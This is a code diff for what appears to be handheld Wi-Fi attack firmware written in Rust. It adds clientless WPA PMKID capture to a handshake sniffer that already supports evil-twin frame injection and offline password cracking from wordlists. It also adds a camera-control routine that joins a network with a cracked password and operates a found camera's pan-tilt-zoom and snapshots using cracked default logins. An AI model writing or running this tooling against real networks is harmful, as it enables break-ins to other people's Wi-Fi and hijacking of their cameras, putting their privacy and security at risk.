@@ -28,6 +28,7 @@ pub mod http;
 pub mod netscan;
 pub mod offload;
 pub mod portal;
+pub mod sha256;
 pub mod webui;
 pub mod wifi_frames;
 pub mod wpa;
@@ -148,6 +149,9 @@ struct HsState {
     eapol: [u8; 256], // the msg2 802.1X frame, MIC field zeroed (ready for the check)
     eapol_len: usize,
     key_ver: u8,
+    have_pmkid: bool, // an RSN PMKID was lifted from a target msg1 (clientless crack)
+    pmkid: [u8; 16],
+    pmkid_sta: [u8; 6], // the STA the msg1 was addressed to (needed for the PMKID hash)
 }
 impl HsState {
     const ZERO: Self = Self {
@@ -161,6 +165,9 @@ impl HsState {
         eapol: [0; 256],
         eapol_len: 0,
         key_ver: 2,
+        have_pmkid: false,
+        pmkid: [0; 16],
+        pmkid_sta: [0; 6],
     };
 }
 struct HsCell(core::cell::UnsafeCell<HsState>);
@@ -174,6 +181,8 @@ static HS: HsCell = HsCell(core::cell::UnsafeCell::new(HsState::ZERO));
 // touching HS (a `&HsState` peek would alias the cb's `&mut` — UB under -O3/LTO).
 static HS_M1: AtomicBool = AtomicBool::new(false);
 static HS_M2: AtomicBool = AtomicBool::new(false);
+// an RSN PMKID was captured from a target msg1 (clientless: crackable without msg2).
+static HS_PMKID: AtomicBool = AtomicBool::new(false);
 // Most recent client MAC seen talking TO our BSSID, published for msg1 injection
 // (packed into 2 u32 + a ready flag so the capture loop reads it without aliasing HS).
 static HS_CLIENT_HI: AtomicU32 = AtomicU32::new(0); // MAC bytes 0..2
@@ -257,6 +266,15 @@ fn handshake_cb(pkt: esp_radio::wifi::sniffer::PromiscuousPkt<'_>) {
             st.anonce = k.nonce;
             st.have_m1 = true;
             HS_M1.store(true, Ordering::Relaxed);
+            // msg1 may carry an RSN PMKID — a clientless crack handle (no msg2 needed).
+            if k.msg == 1 {
+                if let Some(p) = k.pmkid {
+                    st.pmkid = p;
+                    st.pmkid_sta = k.sta; // the STA this msg1 was addressed to
+                    st.have_pmkid = true;
+                    HS_PMKID.store(true, Ordering::Relaxed);
+                }
+            }
         }
         2 => {
             // In evil-twin mode only keep the msg2 that answers OUR injected msg1
@@ -737,6 +755,7 @@ impl Radio {
         DBG_LEN.store(0, Ordering::Relaxed);
         HS_M1.store(false, Ordering::Relaxed);
         HS_M2.store(false, Ordering::Relaxed);
+        HS_PMKID.store(false, Ordering::Relaxed);
         HS_CLIENT_RDY.store(false, Ordering::Relaxed);
         // evil-twin (inject) mode only keeps the msg2 echoing our injected replay.
         WANT_REPLAY.store(if inject.is_some() { INJECT_REPLAY } else { 0 }, Ordering::Relaxed);
@@ -790,7 +809,9 @@ impl Radio {
             let got = if inject.is_some() {
                 HS_M2.load(Ordering::Relaxed)
             } else {
-                HS_M1.load(Ordering::Relaxed) && HS_M2.load(Ordering::Relaxed)
+                // a PMKID from msg1 is clientless — enough on its own; else need the 4-way.
+                HS_PMKID.load(Ordering::Relaxed)
+                    || (HS_M1.load(Ordering::Relaxed) && HS_M2.load(Ordering::Relaxed))
             };
             let eapol = EAPOL_COUNT.load(Ordering::Relaxed);
             if HS_DIAG && (got || ticks % 25 == 0) {
@@ -828,13 +849,16 @@ impl Radio {
         }
         // SAFETY: promiscuous mode is off now; the cb is quiesced.
         let snap = unsafe { *HS.0.get() };
-        // Passive sniff needs BOTH nonces off-air (msg1 + msg2). Evil-twin supplies the
+        // A PMKID (passive only) is a complete clientless artifact on its own. Otherwise:
+        // passive sniff needs BOTH nonces off-air (msg1 + msg2); evil-twin supplies the
         // ANonce itself (we injected it), so it only needs the client's msg2.
-        let ok = if inject.is_some() {
-            snap.have_m2 && snap.eapol_len > 0
-        } else {
-            snap.have_m1 && snap.have_m2 && snap.eapol_len > 0
-        };
+        let have_pmkid = inject.is_none() && snap.have_pmkid;
+        let ok = have_pmkid
+            || if inject.is_some() {
+                snap.have_m2 && snap.eapol_len > 0
+            } else {
+                snap.have_m1 && snap.have_m2 && snap.eapol_len > 0
+            };
         if !ok {
             return Some(HsOutcome { eapol, captured: false, cracked: None, hc22000: None });
         }
@@ -845,14 +869,21 @@ impl Radio {
         hs.ssid[..sl].copy_from_slice(&sb[..sl]);
         hs.ssid_len = sl;
         hs.ap_mac = bssid;
-        hs.cli_mac = snap.cli_mac;
-        hs.anonce = inject.unwrap_or(snap.anonce); // evil-twin: the ANonce we injected
-        hs.snonce = snap.snonce;
-        hs.mic = snap.mic;
-        hs.key_ver = snap.key_ver;
-        let el = snap.eapol_len.min(256);
-        hs.eapol[..el].copy_from_slice(&snap.eapol[..el]);
-        hs.eapol_len = el;
+        if have_pmkid {
+            // clientless: crack via PMK-Name HMAC over AP+the STA the msg1 targeted.
+            hs.cli_mac = snap.pmkid_sta;
+            hs.pmkid = Some(snap.pmkid);
+            esp_println::println!("[HS:{}] PMKID captured (clientless)", mode);
+        } else {
+            hs.cli_mac = snap.cli_mac;
+            hs.anonce = inject.unwrap_or(snap.anonce); // evil-twin: the ANonce we injected
+            hs.snonce = snap.snonce;
+            hs.mic = snap.mic;
+            hs.key_ver = snap.key_ver;
+            let el = snap.eapol_len.min(256);
+            hs.eapol[..el].copy_from_slice(&snap.eapol[..el]);
+            hs.eapol_len = el;
+        }
         // offline crack: the built-in weak list first (PBKDF2 is slow; abortable),
         // then the optional SD wordlist (`extra`, streamed line by line).
         let mut cracked: Option<String> = None;
@@ -1091,10 +1122,11 @@ impl Radio {
     /// Join `ssid` (`known`: Some(pass)=join, empty=open, None=crack ladder), DHCP,
     /// then sweep the local `/24` for HTTP cameras/DVRs + try default creds. The STA
     /// is torn down on exit. `Err(reason)` carries a SPECIFIC failure string.
-    pub fn run_camscan(
+    pub fn run_camscan<D: embedded_sdmmc::BlockDevice, T: embedded_sdmmc::TimeSource>(
         &mut self,
         ssid: &str,
         known: Option<&str>,
+        vm: &embedded_sdmmc::VolumeManager<D, T>,
         mut tick: impl FnMut(&camscan::CamResult) -> bool,
     ) -> Result<camscan::CamResult, &'static str> {
         let mut crack = camscan::CamResult::new();
@@ -1106,10 +1138,38 @@ impl Radio {
         })?;
         let sta = self.wifi_ifaces.as_ref().ok_or("no iface")?.station;
         let mac = sta.mac_address();
-        let mut res = camscan::sweep(sta, mac, tick);
+        let mut res = camscan::sweep(sta, mac, vm, tick);
         res.set_wifi_pass(cracked);
         self.deinit_wifi();
         Ok(res)
+    }
+
+    /// Interactive camera control: re-join `ssid` (`known` = the WiFi pass from the
+    /// prior sweep), DHCP, then drive PTZ nudges + snapshot refreshes on the camera at
+    /// `ip:port` from the `input` UI closure until it returns `Quit`. `cred` is the
+    /// cracked `user:pass`; `basic`/`digest` pick the auth scheme. STA torn down on exit.
+    #[inline(never)]
+    #[allow(clippy::too_many_arguments)]
+    pub fn run_camctl<D: embedded_sdmmc::BlockDevice, T: embedded_sdmmc::TimeSource>(
+        &mut self,
+        ssid: &str,
+        known: Option<&str>,
+        ip: [u8; 4],
+        port: u16,
+        brand: &'static str,
+        basic: bool,
+        digest: bool,
+        cred: &str,
+        vm: &embedded_sdmmc::VolumeManager<D, T>,
+        input: impl FnMut(&camscan::CamCtl) -> camscan::CamCmd,
+    ) -> Result<(), &'static str> {
+        let (user, pass) = cred.split_once(':').unwrap_or((cred, ""));
+        self.associate(ssid, known, |_, _| true)?;
+        let sta = self.wifi_ifaces.as_ref().ok_or("no iface")?.station;
+        let mac = sta.mac_address();
+        camscan::control(sta, mac, ip, port, brand, basic, digest, user, pass, vm, input);
+        self.deinit_wifi();
+        Ok(())
     }
 
     // ----------------------------- crack offload ----------------------------
